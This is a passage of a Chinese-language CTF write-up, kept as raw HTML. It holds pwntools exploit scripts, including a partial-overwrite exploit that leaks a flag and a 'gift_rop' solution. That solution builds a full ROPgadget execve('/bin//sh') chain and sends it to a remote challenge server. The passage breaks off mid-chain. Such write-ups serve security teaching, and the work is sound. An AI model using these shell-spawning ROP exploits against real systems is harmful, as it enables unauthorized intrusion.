<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span><span class="token number">31141</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Here is your gift: '</span><span class="token punctuation">)</span>    flag <span class="token operator">+=</span> r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">b'with the result?'</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x11</span> <span class="token operator">+</span> <span class="token string">b'\x6d'</span><span class="token punctuation">)</span>li<span class="token punctuation">(</span>flag<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gift-rop"><a href="#gift-rop" class="headerlink" title="gift_rop"></a>gift_rop</h2><p>打开程序，发现是静态编译的<code>c</code>，所以可以通过<code>ropgadget</code>直接获取<code>ropchain</code>，指令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span>  ./pwn <span class="token parameter variable">--ropchain</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>执行指令之后会返回很多<code>gadget</code>地址以及一段现成的<code>ropchain</code>，如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000448077</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401f2f</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000047f20b</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; pop rbx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x4141414141414141</span><span class="token punctuation">)</span> <span class="token comment"># padding</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471270</span><span class="token punctuation">)</span> <span class="token comment"># add rax, 1 ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401ce4</span><span class="token punctuation">)</span> <span class="token comment"># syscall</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段<code>ropchain</code>是控制返回地址之后执行的内容，由于<code>python</code>语法格式，要把<code>p +=</code>前面的多余空格去掉，这段代码发过去会报错，因为最后一段重复执行<code>add rax，1</code>，长度太长了，所以就需要从返回的<code>gadget</code>中找到可替代的<code>gadget</code>，格式就是将<code>gadget</code>地址放在<code>Q</code>后面。<code>execve</code>的系统调用号在64位中是59，所以最后一段的目的就是把<code>rax</code>加到59，但是返回的<code>gadget</code>太多，可以用<code>grep</code>筛选一下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ROPgadget <span class="token parameter variable">--binary</span>  ./pwn <span class="token parameter variable">--ropchain</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">'rax'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到以下两条<code>gadget</code>，用这两条代替<code>add rax， 1</code>凑到<code>59</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x0000000000471267 <span class="token builtin class-name">:</span> <span class="token function">add</span> rax, <span class="token number">2</span> <span class="token punctuation">;</span> ret0x0000000000471280 <span class="token builtin class-name">:</span> <span class="token function">add</span> rax, <span class="token number">3</span> <span class="token punctuation">;</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'101.32.220.189'</span><span class="token punctuation">,</span> <span class="token number">32151</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''bin_sh = 0x4C50F0pop_rdi_ret = 0x0000000000401f2fp = p64(pop_rdi_ret) + p64(bin_sh) + p64(system)'''</span><span class="token keyword">from</span> struct <span class="token keyword">import</span> pack<span class="token comment"># Padding goes here</span>p <span class="token operator">=</span> <span class="token string">b''</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000448077</span><span class="token punctuation">)</span> <span class="token comment"># pop rax ; ret</span>p <span class="token operator">+=</span> <span class="token string">b'/bin//sh'</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000044a4f5</span><span class="token punctuation">)</span> <span class="token comment"># mov qword ptr [rsi], rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000401f2f</span><span class="token punctuation">)</span> <span class="token comment"># pop rdi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e0</span><span class="token punctuation">)</span> <span class="token comment"># @ .data</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000409f9e</span><span class="token punctuation">)</span> <span class="token comment"># pop rsi ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000047f20b</span><span class="token punctuation">)</span> <span class="token comment"># pop rdx ; pop rbx ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x00000000004c50e8</span><span class="token punctuation">)</span> <span class="token comment"># @ .data + 8</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x4141414141414141</span><span class="token punctuation">)</span> <span class="token comment"># padding</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x000000000043d1d0</span><span class="token punctuation">)</span> <span class="token comment"># xor rax, rax ; ret</span>p <span class="token operator">+=</span> pack<span class="token punctuation">(</span><span class="token string">'&lt;Q'</span><span class="token punctuation">,</span> <span class="token number">0x0000000000471280</span><span class="token punctuation">)</span> <span class="token comment"># 